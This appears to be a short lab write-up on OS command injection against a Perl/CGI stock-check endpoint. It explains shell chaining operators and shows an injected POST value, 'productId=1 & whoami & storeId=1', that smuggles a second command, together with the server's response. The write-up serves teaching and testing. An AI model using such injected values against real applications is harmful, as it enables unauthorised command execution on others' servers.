---
title: "Research: OS Command Injection Execution Flow"
date: 2025-11-27
draft: false
description: "Technical analysis of shell operator injection in legacy Perl/CGI scripts."
tags: ["Web Security", "RCE", "PortSwigger"]
---

## Injection Context
Legacy applications often interface with the operating system using shell wrappers. A common pattern observed in inventory systems involves passing user IDs directly to backend scripts.

**Vulnerable Logic:**
```bash
stockreport.pl <productID> <storeID>
```

If the application fails to sanitize `productID`, the shell's command separator logic can be abused to chain execution.

## Shell Operator Chaining
The success of an injection depends on how the underlying shell interprets control operators:

* **`&` (Background):** Executes the preceding command and immediately moves to the next.
* **`;` (Sequence):** Executes commands strictly sequentially (Linux only).
* **`||` (OR):** Executes the second command only if the first fails.

## Assessment Case Study
**Target Endpoint:** `/product/stock`
**Method:** POST

During analysis, I intercepted a stock check request. The backend expected a numeric `productId`.

**Injected Payload:**
```http
productId=1 & whoami & storeId=1
```

**Execution Flow on Server:**
1. `stockreport.pl 1` (Executed successfully)
2. `whoami` (Injected command executed)
3. `1` (Remaining argument treated as command, likely failed)

**Raw HTTP Response:**
```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8

peter-3vyaW3
```

The response confirmed code execution by returning the current user context (`peter-3vyaW3`) alongside the standard application output.
